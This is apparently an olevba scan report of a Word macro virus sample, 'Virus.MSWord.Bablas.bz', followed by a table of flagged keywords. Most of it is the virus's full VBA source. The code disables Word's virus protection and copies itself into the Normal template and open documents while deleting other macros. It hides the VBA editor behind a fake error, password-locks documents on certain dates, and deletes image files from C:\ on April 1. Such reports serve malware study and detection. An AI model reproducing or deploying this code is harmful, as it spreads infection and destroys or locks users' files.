olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Bablas.bz
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Bablas.bz - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Mcik1.bas 
in file: Virus.MSWord.Bablas.bz - OLE stream: 'Macros/VBA/Mcik1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub Alert()
    If Month(Now()) = 7 Then
    Assistant.Visible = True
    With Assistant.NewBalloon
         .Icon = msoIconAlert
         .Text = "Happy birthday to bieB..."
         .Heading = "My heart to You"
         .Show
    End With
    ElseIf Month(Now()) = 11 Then
    Assistant.Visible = True
    With Assistant.NewBalloon
         .Icon = msoIconAlert
         .Text = "Congratulate for your Virus & Make Viruses Again & more destroyed"
         .Heading = "Happy birthday to Macik..."
         .Show
    End With
    End If
    End Sub
    Sub Alert1()
    If Time >= TimeValue("11:00:00") And Time <= TimeValue("12:59:59") Then
    Assistant.Visible = True
    With Assistant.NewBalloon
         .Icon = msoIconAlert
         .Text = " SHOLAT JUM'AT DULU YAAAA.."
         .Heading = "Inga'-Inga'"
         .Show
    End With
 End If
End Sub

Sub Bablas()
    Options.SaveNormalPrompt = False
    Options.VirusProtection = False
    Options.SavePropertiesPrompt = False
End Sub

Sub ToolsMacro()
    H = MsgBox("Microsoft Office Error.", vbExclamation + vbOKOnly)
End Sub

Sub ViewVbCode()
    ToolsMacro
End Sub

Sub FileTemplates()
    ToolsMacro
End Sub

Sub HelpAbout()
    H = MsgBox("Salam dari Author....." & Chr(13) & Chr(13) & _
    "Bagi para Hacker atau yang sok Hacker!" & Chr(13) & _
    "di Yogya atau dimana aja, Anda boleh" & Chr(13) & _
    "Modifikasi ini Virus, Tapi jangan Asal" & Chr(13) & _
    "Nampang (Jangan Malu-Maluin), Oke...!", vbOKOnly + vbExclamation, "Macik")
End Sub

Sub ToolsOptions()
    Options.SaveNormalPrompt = True
    Options.SavePropertiesPrompt = True
    Options.VirusProtection = True
    Dialogs(wdDialogToolsOptions).Show
    Bablas
End Sub

Sub ChangeCap()
    On Error Resume Next
    Application.Caption = "@"
    ActiveWindow.Caption = "Mcik"
End Sub

Sub RestoreCap()
    On Error Resume Next
    Application.Caption = "Microsoft Word"
    ActiveWindow.Caption = ActiveDocument.Name
End Sub

Sub OpenMyMacro()
    If InputBox("Enter password") = "Mcik" Then Application.ShowVisualBasicEditor = True
End Sub

Sub SikatDocument()
    Dim DocOk As Boolean
    DocOk = False
    For Each Obj In ActiveDocument.VBProject.VBComponents
        If Obj.Name = "Mcik1" Then DocOk = True
        If Obj.Name <> "Mcik1" And Obj.Name <> "ThisDocument" Then
            Application.OrganizerDelete Source:=ActiveDocument.FullName, _
            Name:=Obj.Name, Object:=wdOrganizerObjectProjectItems
        End If
    Next Obj
    If DocOk = False Then
        Application.OrganizerCopy Source:=NormalTemplate.FullName, _
        Destination:=ActiveDocument, Name:="Mcik1", Object:=wdOrganizerObjectProjectItems
    End If
End Sub

Sub SikatTemplate()
    Dim NorOk As Boolean
    NorOk = False
    For Each Obj In NormalTemplate.VBProject.VBComponents
        If Obj.Name = "Mcik1" Then NorOk = True
        If Obj.Name <> "Mcik1" And Obj.Name <> "ThisDocument" Then
            Application.OrganizerDelete Source:=NormalTemplate.FullName, _
            Name:=Obj.Name, Object:=wdOrganizerObjectProjectItems
        End If
    Next Obj
    If NorOk = False Then
        Application.OrganizerCopy Source:=ActiveDocument.FullName, _
        Destination:=NormalTemplate.FullName, Name:="Mcik1", Object:=wdOrganizerObjectProjectItems
        Application.DisplayRecentFiles = False
        Application.DisplayRecentFiles = True
    End If
End Sub

Sub AutoExit()
    If (WeekDay(Date) = vbFriday) Then
    H = MsgBox("Sorry Mcik Menggangu", vbOKOnly + vbExclamation, "Mcik")
    End If
    Application.Quit
End Sub

Sub FileOpen()
    ChangeCap
    WordBasic.DisableAutoMacros True
    On Error Resume Next
    If Dialogs(wdDialogFileOpen).Show <> 0 Then
        SikatDocument
        ActiveDocument.Save
    End If
    RestoreCap
    WordBasic.DisableAutoMacros False
End Sub

Sub AutoOpen()
    Bablas
    ChangeCap
    SikatTemplate
    On Error Resume Next
    NormalTemplate.Save
    RestoreCap
End Sub

Sub AutoClose()
    SikatDocument
    On Error Resume Next
    If Month(Now()) = 4 And (WeekDay(Date) = vbSunday) Then
      If Time >= TimeValue("11:00:00") And Time >= TimeValue("12:59:59") Then
         If ActiveDocument.HasPassword = False Then
            ActiveDocument.Password = "@Mcik"
            ActiveDocument.Save
         End If
      End If
    End If
End Sub

Sub FileClose()
    SikatDocument
    On Error Resume Next
    If (WeekDay(Date) = vbFriday) Then
    Alert1
    GoTo Tutup:
    End If
    Alert
Tutup:
    ActiveDocument.Close
End Sub

Sub FileSave()
    If ActiveDocument.Saved = False Then
        SikatDocument
        SikatTemplate
        On Error Resume Next
        ActiveDocument.Save
        ActiveDocument.Saved = True
    End If
End Sub

Sub Ancurin()
    C = Documents.Count
    If C <> 0 Then
        Normal.Mcik1.SikatDocument
        WordBasic.DisableAutoMacros False
        On Error Resume Next
        If ActiveDocument.Name <> "Document1" Then ActiveDocument.Save
    Else: Application.OnTime Now + TimeValue("00:00:07"), "Normal.Mcik1.Ancurin"
    End If
End Sub

Sub AutoExec()
    WordBasic.DisableAutoMacros True
    Bablas
    Application.OnTime Now + TimeValue("00:00:07"), "Normal.Mcik1.Ancurin"
End Sub
Sub FileExit()
    On Error Resume Next
    If Month(Now()) = 4 And Day(Now()) = 1 Then
    Kill "C:\*.BMP"
    Kill "C:\*.JPG"
    Kill "C:\*.GIF"
    End If
    AutoExit
    Aplication.Quit
End Sub


+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

